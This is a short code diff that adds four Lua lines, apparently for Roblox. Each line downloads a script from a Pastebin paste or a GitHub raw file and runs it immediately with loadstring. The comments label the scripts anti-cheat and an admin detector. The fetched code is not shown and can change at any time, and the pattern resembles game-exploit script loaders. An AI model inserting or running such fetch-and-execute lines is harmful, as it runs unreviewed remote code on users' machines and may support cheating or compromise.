@@ -1,0 +1,4 @@
+loadstring(game:HttpGet(('https://pastebin.com/raw/zac8V2t6'),true))()--anti cheat for main
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/veryskilledperson/anti/main/admin%20detec'),true))()--new admin dector
+loadstring(game:HttpGet(('https://pastebin.com/raw/f1kW0uvC'),true))()--anti cheat for speed
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/veryskilledperson/anti/main/chat'),true))()--anti cheat
